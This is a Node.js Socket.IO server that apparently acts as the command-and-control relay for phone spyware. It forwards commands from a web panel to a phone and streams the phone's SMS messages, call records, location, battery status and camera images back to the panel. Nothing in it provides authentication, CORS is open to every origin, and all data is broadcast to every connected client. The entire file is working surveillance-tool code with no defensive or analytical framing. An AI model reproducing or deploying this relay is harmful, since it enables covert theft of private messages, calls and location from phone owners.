const express = require('express');
const http = require('http');
const path = require('path'); // Added to fix the ENOENT error
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);

// Increase buffer size to 100MB to handle camera images
const io = new Server(server, {
    maxHttpBufferSize: 1e8,
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

const PORT = process.env.PORT || 3000;

// Correct way to serve the HTML file on Render
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Serve other static files (like icons or CSS) if they exist
app.use(express.static(path.join(__dirname)));

io.on('connection', (socket) => {
    console.log('User connected:', socket.id);

    // COMMAND: WEB -> PHONE
    socket.on('phone-execute', (cmd) => {
        console.log('Sending command to phone:', cmd);
        io.emit('phone-execute', cmd);
    });

    // DATA: PHONE -> WEB
    socket.on('battery-update', (data) => {
        io.emit('battery-update', data);
    });

    socket.on('location-update', (data) => {
        io.emit('location-update', data);
    });

    socket.on('sms-data', (data) => {
        io.emit('sms-data', data);
    });

    socket.on('call-data', (data) => {
        io.emit('call-data', data);
    });

    socket.on('data-stream', (data) => {
        io.emit('data-stream', data);
    });

    socket.on('disconnect', () => {
        console.log('User disconnected');
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running on port ${PORT}`);
});
